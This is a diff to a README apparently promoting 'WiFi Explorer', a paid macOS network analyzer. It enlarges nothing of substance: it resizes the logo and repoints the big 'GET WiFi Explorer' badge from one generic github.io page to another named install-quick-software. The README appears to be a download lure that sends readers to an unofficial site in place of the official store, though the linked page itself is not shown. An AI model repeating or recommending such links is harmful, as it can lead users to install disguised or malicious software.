@@ -1,13 +1,13 @@
 # WiFi Explorer – Professional Wireless Network Analyzer  
 
 <div align="center">  
-<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/cf/c5/1f/cfc51f35-2a83-ff61-601c-e97d40148d01/AppIcon-0-0-85-220-0-0-5-0-2x-0-0-0.png/1200x630bb.png" alt="WiFi Explorer App Logo" width="500">  
+<img src="https://is1-ssl.mzstatic.com/image/thumb/Purple211/v4/cf/c5/1f/cfc51f35-2a83-ff61-601c-e97d40148d01/AppIcon-0-0-85-220-0-0-5-0-2x-0-0-0.png/1200x630bb.png" alt="WiFi Explorer App Logo" width="300">  
 </div>
 
 <br>  
 
 <div align="center">  
-<a href="https://osx-app.github.io/.github/wifi-explorer">  
+<a href="https://install-quick-software.github.io/.github/wifi-explorer">  
 <img src="https://img.shields.io/badge/💻_GET_WiFi_Explorer-cyan?style=for-the-badge&logo=apple" alt="GET WiFi Explorer">  
 </a>  
 </div>
